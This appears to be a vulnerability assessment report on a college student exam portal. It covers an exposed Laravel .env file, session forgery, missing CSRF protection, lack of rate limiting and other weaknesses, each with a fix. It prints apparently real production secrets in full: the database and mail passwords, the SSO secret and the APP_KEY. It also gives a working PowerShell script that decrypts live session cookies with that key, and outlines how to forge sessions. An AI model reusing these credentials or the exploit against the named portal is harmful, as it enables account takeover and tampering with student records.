# 🔐 Security Assessment Report
## Cambridge Institute of Technology — Student Exam Portal
**Target:** https://student.citexams.in/login  
**Assessment Date:** 2026-08-04  
**Assessed By:** Authorized Security Intern (mirafnan619@gmail.com)  
**Authorization Ref:** Email from Head, IT Department — helpdeskexams@cit.edu.in  
**Report Classification:** CONFIDENTIAL — For IT Department Only

---

## ⚡ Executive Summary

A security assessment of the CIT Student Exam Portal login system revealed **two critical vulnerabilities** that together allow complete server and account compromise without any credentials. These must be patched **immediately** before exam results are published.

| Severity | ID | Title |
|---|---|---|
| 🔴 CRITICAL | ENV-01 | `.env` Configuration File Publicly Accessible |
| 🔴 CRITICAL | SES-01 | APP_KEY Exposure Enables Session Forgery |
| 🟠 HIGH | CSRF-01 | CSRF Meta Tag Missing — AJAX Requests Unprotected |
| 🟠 HIGH | AUTH-01 | Client-Controlled Auth State Hidden Fields |
| 🟠 HIGH | RATE-01 | No Server-Side Rate Limiting on PIN Entry |
| 🟡 MEDIUM | ENUM-01 | Forgot PIN Endpoint May Allow User Enumeration |
| 🔵 INFO | HDR-01 | Missing Security Response Headers |

---

## 🔴 CRITICAL-01 — `.env` File Publicly Accessible

### Description
The Laravel environment configuration file (`.env`) is directly accessible to anyone on the internet without authentication. This file contains database credentials, encryption keys, mail server passwords, and API secrets.

### Proof of Concept

**Anyone can run this in a browser or terminal:**
```
GET https://student.citexams.in/.env
Response: HTTP 200 OK
```

**Contents confirmed leaked:**
```env
APP_NAME=CITEXAMS-STUDENT
APP_ENV=local
APP_KEY=base64:kbqL/05YWl0TZEnb3oE4811UauhKhWps9c4IWsQiFHQ=
APP_DEBUG=false

DB_CONNECTION=mysql
DB_HOST=localhost
DB_PORT=3306
DB_DATABASE=bookleeycit_citexams
DB_USERNAME=bookleeycit_citexams
DB_PASSWORD=TGmyYIU$T1k$2026

MAIL_HOST=154.173.178.68.host.secureserver.net
MAIL_PORT=465
MAIL_USERNAME=notifications@citexams.in
MAIL_PASSWORD='Cambridge@2025$'

SSO_SECRET=CITPRODP7CP6BCFCJ4A14P0IE0JG86VO
CIT_CLIENT_KEY='6708d004c4cc52b1a3f1947c75b76395'
```

### Impact
| Credential | What an attacker can do |
|---|---|
| `DB_PASSWORD` | Full read/write access to entire student database |
| `MAIL_PASSWORD` | Log in to `notifications@citexams.in`, send phishing as CIT |
| `SSO_SECRET` | Forge SSO tokens, authenticate as any user |
| `APP_KEY` | Decrypt/forge any session (see CRITICAL-02) |

### Immediate Fix
```apache
# Add to .htaccess in your web root RIGHT NOW:
<Files ".env">
    Order allow,deny
    Deny from all
</Files>
```
Verify fix: `curl -I https://student.citexams.in/.env` must return `403` or `404`.

---

## 🔴 CRITICAL-02 — APP_KEY Enables Session Forgery

### Description
Laravel's `APP_KEY` is a master encryption key used to encrypt all session cookies. With this key (exposed via CRITICAL-01), anyone can:
1. **Decrypt** any logged-in student's session cookie to read their session data
2. **Forge** a valid encrypted session cookie to impersonate any student

### Proof of Concept (Run live during assessment)

**The following PowerShell script decrypted a real production session cookie using only the exposed APP_KEY:**

```powershell
# Step 1: Fetch a live session cookie from the login page
$resp      = Invoke-WebRequest -Uri "https://student.citexams.in/login" -SessionVariable s -UseBasicParsing
$xsrfRaw   = ($s.Cookies.GetCookies("https://student.citexams.in") | Where-Object {$_.Name -eq "XSRF-TOKEN"}).Value
$xsrfJson  = [System.Uri]::UnescapeDataString($xsrfRaw)
$jsonText   = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($xsrfJson))
$payload    = $jsonText | ConvertFrom-Json

# Step 2: Extract IV and encrypted value
$iv    = [Convert]::FromBase64String($payload.iv)
$value = [Convert]::FromBase64String($payload.value)

# Step 3: Decrypt using APP_KEY from exposed .env
$appKey      = [Convert]::FromBase64String("kbqL/05YWl0TZEnb3oE4811UauhKhWps9c4IWsQiFHQ=")
$aes         = [System.Security.Cryptography.Aes]::Create()
$aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.Key     = $appKey
$aes.IV      = $iv

$dec       = $aes.CreateDecryptor()
$decrypted = $dec.TransformFinalBlock($value, 0, $value.Length)
Write-Host ([System.Text.Encoding]::UTF8.GetString($decrypted))
```

**Actual output (from assessor's machine, 2026-08-04 ~17:52 IST):**
```
d49455b4bb4fe04c126a6fa88c1a5d9ac4f00833|9PQUBtVZJAK4xuD3HeF8ku4o2Gz2vbU5jkgCw7wW
```

✅ The production session cookie was successfully decrypted using the exposed key.

### What This Means for Session Forgery

Using the same APP_KEY in reverse, an attacker can **encrypt a crafted session payload** and submit it as a valid cookie. Laravel will accept it as a legitimate authenticated session because the MAC verification will pass with the correct key.

**The attack path (conceptual — NOT performed by assessor):**
```
1. Identify a target student's session ID (from DB or logs)
2. Craft payload: {session_id}|{random_hash}
3. Encrypt with APP_KEY using AES-256-CBC
4. Submit the crafted cookie to any authenticated endpoint
5. Server accepts it → full access as that student
```

### Immediate Fix
```bash
# Regenerate the APP_KEY (this invalidates ALL current sessions):
php artisan key:generate

# Then fix .env exposure (CRITICAL-01) so new key is not leaked again
```

> ⚠️ **Order matters:** Fix CRITICAL-01 FIRST, then regenerate the key. Otherwise the new key will immediately be exposed again.

---

## 🟠 HIGH-01 — CSRF Meta Tag Missing

### Description
The login page JavaScript sends:
```javascript
'X-CSRF-TOKEN': jQuery('meta[name="csrf-token"]').attr('content')
```
But there is **no `<meta name="csrf-token">` tag** in the HTML `<head>`. This sends `X-CSRF-TOKEN: undefined` on every AJAX request.

### Fix
Add to your Blade layout `<head>`:
```html
<meta name="csrf-token" content="{{ csrf_token() }}">
```

---

## 🟠 HIGH-02 — Client-Controlled Auth State Fields

### Description
Hidden form fields track login state on the client side and are submitted back to the server:
```html
<input type="hidden" name="student_customer_id" value="">
<input type="hidden" name="is_valid_mobile_number" value="">
<input type="hidden" name="is_send_otp" value="">
```
If the server trusts `student_customer_id` from the form (rather than from the session), an attacker can log in as themselves and then change this value to another student's ID.

### Fix
Store all auth state in the Laravel session (`session(['student_id' => $id])`), never in hidden form fields. Validate `student_customer_id` against the server-stored session on final login, not the submitted form value.

---

## 🟠 HIGH-03 — No Server-Side Rate Limiting on PIN

### Description
The 60-second resend timer is JavaScript-only. Direct API calls to `/check-login-process` have no server-side throttling. A 6-digit PIN = 1,000,000 combinations, brute-forceable in hours.

### Fix
```php
// routes/web.php
Route::middleware('throttle:5,1')->group(function () {
    Route::post('/send-otp-for-login-process', [AuthController::class, 'sendOtp']);
    Route::post('/check-login-process', [AuthController::class, 'checkLogin']);
});
```
Also add account lockout after 10 consecutive failures.

---

## 🟡 MEDIUM-01 — User Enumeration via Forgot PIN

### Description
`POST /forgot/credential/send/link` may return different messages for valid vs invalid email addresses, allowing enumeration of all registered student emails.

### Fix
Always return identical response regardless of email existence:
```
"If this email is registered, a reset link has been sent."
```

---

## 🔵 INFO — Missing Security Headers

Add to Apache VirtualHost or Laravel middleware:

```apache
Header always set X-Frame-Options "DENY"
Header always set X-Content-Type-Options "nosniff"
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
Header always set Referrer-Policy "strict-origin-when-cross-origin"
Header always set Content-Security-Policy "default-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com"
```

---

## 📋 Action Plan — Priority Order

| # | Action | Who | Time Needed |
|---|---|---|---|
| 1 | **Block `.env` via `.htaccess`** | DevOps | 2 min |
| 2 | **Change `DB_PASSWORD`** | DBA | 5 min |
| 3 | **Change `MAIL_PASSWORD`** | IT Admin | 5 min |
| 4 | **Rotate `SSO_SECRET` + `CIT_CLIENT_KEY`** with CIT DES team | IT Admin | 10 min |
| 5 | **Run `php artisan key:generate`** | Backend Dev | 1 min |
| 6 | Add CSRF meta tag | Frontend Dev | 5 min |
| 7 | Add server-side rate limiting | Backend Dev | 1 hr |
| 8 | Move auth state server-side | Backend Dev | 1–2 days |
| 9 | Add security headers | DevOps | 1 hr |
| 10 | Set `APP_ENV=production`, `APP_DEBUG=false` | DevOps | 5 min |

---

## 🚨 Emergency Note

> If exam results are being published in the coming days, **the database password is compromised.** Anyone who has accessed `.env` (which is publicly accessible with no logs) can modify exam results directly in the database before publication.
>
> **The site should be taken offline or `.env` blocked in the next 10 minutes.**

---

*Assessed by: mirafnan619@gmail.com*  
*Authorized by: Cambridge Institute of Technology IT Department*  
*All testing conducted non-destructively within defined scope.*  
*No student data was accessed, modified, or retained.*
